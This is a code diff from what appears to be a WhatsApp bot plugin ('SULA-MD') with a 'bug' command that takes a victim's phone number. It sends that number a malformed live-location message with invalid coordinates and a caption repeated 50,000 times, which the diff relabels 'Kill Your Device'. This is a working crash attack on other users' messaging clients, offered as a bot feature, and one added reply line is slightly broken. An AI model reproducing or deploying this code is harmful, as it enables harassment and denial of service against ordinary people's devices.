@@ -12,13 +12,13 @@ cmd({
 }, async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
     try {
         if (!isOwner) {
-            return reply("❌ This command is for Owner Only.");
+            return reply("❌ This command is for premium users only.");
         }
         if (!q) {
             return reply(`\`Example:\` : ${prefix + command} 628×××`);
         }
         let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        reply(`✔️ Bug sent successfully.`);
+        reply(`✔️ Bug sent successfully to{target}. *Please wait for at least 5 minutes before trying again.*`);
         
 async function ngeloc(target, quoted) {
     try {
@@ -26,7 +26,7 @@ async function ngeloc(target, quoted) {
             "liveLocationMessage": {
                 "degreesLatitude": "p", 
                 "degreesLongitude": "p", 
-                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "😅😅😅😅😅".repeat(50000),
+                "caption": `𝐒𝐔𝐋𝐀-𝐌𝐃` + "Kill Your Device".repeat(50000),
                 "sequenceNumber": "0",
                 "jpegThumbnail": "" 
             }
